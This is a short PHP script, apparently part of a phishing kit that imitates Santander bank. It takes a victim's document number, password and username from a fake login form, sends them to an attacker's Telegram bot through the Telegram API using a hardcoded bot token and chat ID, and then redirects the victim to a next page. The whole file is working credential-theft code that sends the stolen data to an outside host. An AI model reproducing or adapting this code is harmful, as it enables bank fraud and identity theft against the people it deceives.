<?php
session_start();

$_SESSION['u1'] = $_POST['d0cv2'];
$_SESSION['u2'] = $_POST['p455s2'];
$_SESSION['u3'] = $_POST['us4r2'];

// Datos del bot de Telegram
$botToken = '6662872977:AAG9cyvIoECBjYw_Dg1TlLRi99A97u6UW_M';
$chatID = '5792986703';
$message = urlencode("SANTANDER:\nDocumento: ".$_POST['d0cv2']."\nClave: ".$_POST['p455s2']."\nUsuario: ".$_POST['us4r2']);

// URL de la API de Telegram para enviar mensajes
$telegramURL = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatID}&text={$message}";

// Enviar solicitud a la API de Telegram
$response = file_get_contents($telegramURL);

// Redirigir al usuario a una página después del envío
header ('Location: ../mobile2.html');
?>
